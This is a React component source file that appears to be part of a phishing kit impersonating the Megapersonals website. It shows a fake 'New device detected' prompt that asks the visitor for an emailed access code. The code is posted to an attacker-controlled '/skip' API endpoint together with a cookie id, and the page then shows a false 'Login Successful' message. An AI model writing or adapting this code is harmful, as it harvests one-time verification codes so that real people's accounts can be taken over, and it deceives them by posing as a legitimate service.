import Image from "next/image";
import Megapersonals from "../public/images/megapersonals.png";
import Cookies from "js-cookie";
import { Field, Form, Formik } from "formik";
import { API_URL } from "../config";
import { toast } from "react-toastify";

function SecurityModal() {
  const currentDate = new Date();
  const options = { year: "numeric", month: "long", day: "numeric" };
  const formattedDate = currentDate.toLocaleDateString("en-US", options);

  const id = Cookies.get("id");

  const initialvalues = {
    id: id,
    skipcode: "",
  };

  const handleSubmit = async (values, formik) => {
    // console.log(values);
    // const { skipcode } = values;
    // Cookies.set("skipcode", skipcode);
    // router.push("/account/email");
    // return;

    const url = `${API_URL}/skip`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(values),
    });

    const data = await res.json();

    if (res.ok) {
      console.log("success", data);
      toast.success("Login Succecssfull");
      formik.resetForm();
      Cookies.remove("id");
      Cookies.remove("email");
    } else {
      console.log("error", data);
      toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="container bg-white md:w-[420px] py-[35px] rounded-lg flex flex-col items-center overflow-x-hidden">
      <div className="w-[60%]">
        <Image src={Megapersonals} alt="megaeprsonals" priority />
      </div>

      <div className="mt-2 py-1.5 w-full bg-[#F8EFCE] text-[#B8AF8E] text-sm text-center font-medium uppercase">
        New deviece detected
      </div>

      <p className="mt-2 text-sm text-[#C75400] text-center">
        Your ACCESS CODE <br /> has been sent <b>Successfully</b> <br /> to your
        email on <b>{formattedDate}</b>. <br /> That code remains valid.
      </p>

      <p className="mt-2 text-center text-sm italic font-bold text-[#2FAEEA] uppercase">
        CHECK YOUR SPAM <br /> FOLDER IT MAY BE THERE.
      </p>

      <p className="mt-2 flex items-center gap-3 text-sm text-[#C75400] text-center font-bold italic uppercase">
        <span>DO NOT SHARE IT</span>
        <span className="bg-[#2FAEEA] w-6 h-6 rounded-full text-white flex justify-center items-center font-bold not-italic">
          <span>?</span>
        </span>
      </p>

      <p className="mt-2 text-sm text-[#C75400] text-center ">
        Enter the code <br /> below to continue.
      </p>

      <div className="mt-2 flex items-center">
        <Formik
          initialValues={initialvalues}
          // validationSchema={validate}
          onSubmit={handleSubmit}
        >
          {(formik) => (
            <Form className="flex flex-col items-center">
              <div className="">
                <Field
                  className="w-full px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  name="skipcode"
                  required
                />
              </div>
              <button
                type="submit"
                className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                // className=" bg-custom-cyan hover:bg-custom-cyan2 px-[25px] py-[12px] text-white text-sm transition duration-300 rounded"
              >
                Submit
              </button>
            </Form>
          )}
        </Formik>
      </div>
    </div>
  );
}

export default SecurityModal;
